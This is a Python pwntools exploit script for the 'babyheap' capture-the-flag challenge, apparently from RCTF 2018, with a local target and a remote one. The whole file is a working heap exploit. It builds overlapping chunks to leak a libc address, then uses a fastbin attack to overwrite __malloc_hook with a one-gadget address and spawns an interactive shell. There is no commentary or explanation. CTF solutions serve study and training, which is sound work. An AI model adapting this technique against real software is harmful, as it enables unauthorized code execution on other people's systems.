#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
from parse import *
context.log_level="debug"
pwn_file="./babyheap"
elf=ELF(pwn_file)
libc=elf.libc
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("babyheap.2018.teamrois.cn",3154)
    pid=0

def debug():
    log.debug("libc address: 0x%x"%libc.address)
    log.debug("process pid:%d"%pid)
    pause()


def add(num,con):
    conn.sendlineafter("choice: ","1")
    conn.sendlineafter("please input chunk size: ",str(num))
    conn.recvuntil("input chunk content: ")
    conn.send(con)

def show(num):
    conn.sendlineafter("choice: ","2")
    conn.sendlineafter("please input chunk index: ",str(num))
    data=conn.recvline()
    con=search("content: {}\n",data)[0]
    return con

def dele(num):
    conn.sendlineafter("choice: ","3")
    conn.sendlineafter("please input chunk index: ",str(num))

add(0x20,"a"*0x20)#0
add(0xa0,"a"*0xa0)#1
add(0x40,"a"*0x40)#2
f={
    0x10:p64(0),
    0x18:p64(0x21),
    0x30:p64(0),
    0x38:p64(0x21)
}
add(0xf0,fit(f,filler="\x00",length=0xf0))#3
add(0x20,"a"*0x20)#4
dele(1)
dele(2)
add(0x48,"1"*0x40+p64(0x100))#1
dele(3)
add(0xa0,"a"*0xa0)#2
data=show(1)
libc.address=u64(data.ljust(8,"\x00"))-0x3c4b78
dele(2)
f={
        0xa0:p64(0),
        0xa8:p64(0x71),
}
add(0xc0,fit(f,filler="a",length=0xc0))
dele(1)
dele(2)
f={
        0xa0:p64(0),
        0xa8:p64(0x71),
        0xb0:p64(libc.sym["__malloc_hook"]-0x13),
}
add(0xc0,fit(f,filler="\x00",length=0xb8)+"\n")
add(0x60,"a"*0x50+"\n")
add(0x60,"a"*3+p64(libc.address+0xf02a4)+"\n")
dele(1)
conn.interactive()
